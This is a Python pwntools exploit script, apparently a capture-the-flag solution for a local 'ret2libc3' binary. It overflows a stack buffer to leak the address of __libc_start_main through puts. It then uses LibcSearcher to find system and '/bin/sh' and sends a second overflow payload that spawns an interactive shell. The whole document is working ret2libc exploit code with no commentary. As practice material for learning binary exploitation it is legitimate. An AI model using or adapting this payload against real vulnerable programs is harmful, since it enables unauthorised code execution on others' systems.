from pwn import *
from LibcSearcher import LibcSearcher

pro=process('./ret2libc3')
libc=ELF('./ret2libc3')

puts_plt=libc.plt['puts']
main=libc.symbols['main']
libc_start_main_got=libc.got['__libc_start_main']


pro.recvuntil('?')
payload='A'*112+p32(puts_plt)+p32(main)+p32(libc_start_main_got)
pro.sendline(payload)
libc_start_main=u32(pro.recv()[0:4])

libcversion=LibcSearcher('__libc_start_main',libc_start_main)
libcbase=libc_start_main-libcversion.dump('__libc_start_main')
syscall=libcbase+libcversion.dump('system')
syssh=libcbase+libcversion.dump('str_bin_sh')

pro.sendline('A'*104+p32(syscall)+'X'*4+p32(syssh))

pro.interactive()
